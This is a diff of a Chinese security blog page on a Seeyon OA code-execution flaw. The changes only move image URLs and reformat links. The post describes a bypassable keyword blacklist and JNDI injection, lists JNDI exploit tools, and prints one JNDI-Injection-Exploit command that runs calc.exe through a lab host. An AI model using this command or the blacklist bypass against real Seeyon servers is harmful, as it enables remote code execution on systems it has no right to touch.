@@ -26,7 +26,7 @@ text">
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
         <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 
-<link rel="canonical" href="https://Rain1er.github.io/posts/seeeyon%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" /><link rel="next" href="https://Rain1er.github.io/posts/test/" />
+<link rel="canonical" href="https://Rain1er.github.io/posts/seeeyon%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" />
 <link rel="stylesheet" href="/css/main.min.css"><link rel="stylesheet" href="/css/style.min.css"><script type="application/ld+json">{"@context": "https://schema.org","@type": "BlogPosting",
         "headline": "Seeeyon代码执行",
         "inLanguage": "en-us",
@@ -680,13 +680,13 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
 </div>
 <p>经过测试，必须加上formulaType参数才可以。
 不加上
-<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/Rain1er.github.io@main/img/1720191016861-5ca4bf4e-7460-4e7a-b3fe-17be4b31a374-20250414175202329.png'   alt="image.png"  >
+<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/1720191016861-5ca4bf4e-7460-4e7a-b3fe-17be4b31a374-20250414175202329-20250414180836810.png'   alt="image.png"  >
 加上
 根据提示，Method threw &lsquo;java.lang.NullPointerException&rsquo; exception. Cannot evaluate com.seeyon.ctp.common.po.formula.Formula.toString()
-<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/Rain1er.github.io@main/img/1720192097310-0367c545-dcea-4f59-95cd-860164258268-20250414174726050-20250414175155020.png'   alt="image.png"  >
+<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/1720192097310-0367c545-dcea-4f59-95cd-860164258268-20250414174726050-20250414175155020-20250414180843916.png'   alt="image.png"  >
 应该是这里对这个属性进行了访问，所以必须给一个值。但是在这里下断点又无法直接命中，我估计是Java特殊的机制导致的？反射？</p>
 <h3 id="注意点" class="headerLink">
-    <a href="#%e6%b3%a8%e6%84%8f%e7%82%b9" class="header-mark"></a>注意点</h3><p>com/seeyon/ctp/common/formula/FormulaUtil.class<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/Rain1er.github.io@main/img/1720192829723-3aeb0bc4-7d05-4461-b258-f587d71e1fba-20250414175146751.png'   alt="image.png"  >
+    <a href="#%e6%b3%a8%e6%84%8f%e7%82%b9" class="header-mark"></a>注意点</h3><p>com/seeyon/ctp/common/formula/FormulaUtil.class<img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/1720192829723-3aeb0bc4-7d05-4461-b258-f587d71e1fba-20250414175146751-20250414180850891.png'   alt="image.png"  >
 执行脚本前对关键字做了检测，不能直接使用Runtime等关键字，所以上面用了jndi注入。
 不过注意到这里是用<code>script.indexOf(keyword)</code>这种方式去检索字符串的，而且是黑名单，存在被绕过的风险。</p>
 <ol>
@@ -695,11 +695,11 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
 <p>后面再补上。</p>
 <h2 id="利用" class="headerLink">
     <a href="#%e5%88%a9%e7%94%a8" class="header-mark"></a>利用</h2><p>关于jndi注入利用的工具：
-<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Exploit</a><!-- raw HTML omitted -->
-<a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Bypass</a><!-- raw HTML omitted -->
-<a href="https://github.com/qi4L/JYso" target="_blank" rel="noopener noreferrer">https://github.com/qi4L/JYso</a><!-- raw HTML omitted -->
-<a href="https://github.com/wyzxxz/jndi_tool" target="_blank" rel="noopener noreferrer">https://github.com/wyzxxz/jndi_tool</a><!-- raw HTML omitted -->
-<a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Bypass</a></p>
+<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Bypass</a></p>
+<p><a href="https://github.com/qi4L/JYso" target="_blank" rel="noopener noreferrer">https://github.com/qi4L/JYso</a></p>
+<p><a href="https://github.com/wyzxxz/jndi_tool" target="_blank" rel="noopener noreferrer">https://github.com/wyzxxz/jndi_tool</a></p>
+<p><a href="https://github.com/welk1n/JNDI-Injection-Bypass" target="_blank" rel="noopener noreferrer">https://github.com/welk1n/JNDI-Injection-Bypass</a></p>
 <div class="code-block highlight is-closed show-line-numbers  tw-group tw-my-2">
   <div class="
     
@@ -791,14 +791,14 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
       tw-scrollbar-thin
       "><span style="display:flex;"><span>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span style="color:#e6db74">&#34;calc.exe&#34;</span> -A <span style="color:#e6db74">&#34;192.168.10.249&#34;</span></span></span></code></pre>
 </div>
-<p><img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/Rain1er.github.io@main/img/1720195270387-7094d47d-d75f-4c73-848d-befdc1340a5e.png'   alt="image.png"  >
+<p><img class="tw-inline" loading="lazy" src='https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/1720195270387-7094d47d-d75f-4c73-848d-befdc1340a5e-20250414180857689.png'   alt="image.png"  >
 这里我的致远JDK版本过高，暂时么有复现，不过漏洞就是这样，剩下的只是不同环境下的利用问题。</p>
 <h2 id="后话" class="headerLink">
     <a href="#%e5%90%8e%e8%af%9d" class="header-mark"></a>后话</h2><p>高版本jndi绕过：
-<a href="https://blog.csdn.net/wfz2333/article/details/139116770" target="_blank" rel="noopener noreferrer">JDK高版本下JNDI注入绕过_java.rmi.dgc.lease”, codebase = ”″, defaultloader -CSDN博客<!-- raw HTML omitted --></a>
-<a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener noreferrer">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖</a><!-- raw HTML omitted -->
-<a href="https://tttang.com/archive/1489/" target="_blank" rel="noopener noreferrer">探索高版本 JDK 下 JNDI 漏洞的利用方法：第二章 - 跳跳糖</a><!-- raw HTML omitted -->
-<a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener noreferrer">浅析JNDI注入Bypass - Welk1n - 博客园</a></p>
+<a href="https://blog.csdn.net/wfz2333/article/details/139116770" target="_blank" rel="noopener noreferrer">JDK高版本下JNDI注入绕过_java.rmi.dgc.lease”, codebase = ”″, defaultloader -CSDN博客</a>](<a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1405/</a>)</p>
+<p><a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener noreferrer">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖</a></p>
+<p><a href="https://tttang.com/archive/1489/" target="_blank" rel="noopener noreferrer">探索高版本 JDK 下 JNDI 漏洞的利用方法：第二章 - 跳跳糖</a></p>
+<p><a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener noreferrer">浅析JNDI注入Bypass - Welk1n - 博客园</a></p>
 </div>
 
         <div class="post-footer" id="post-footer">
@@ -822,9 +822,7 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
         </section>
     </div>
 
-    <div class="post-nav print:tw-hidden">
-            <a href="/posts/test/" class="next" rel="next" title="Test">Test<svg class="icon"
-    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9 0l-22.6-22.6c-9.4-9.4-9.4-24.6 0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6 0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9 0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></a></div>
+    <div class="post-nav print:tw-hidden"></div>
 </div>
 </article></main><footer class="footer">
         <div class="footer-container"><div class="footer-line">
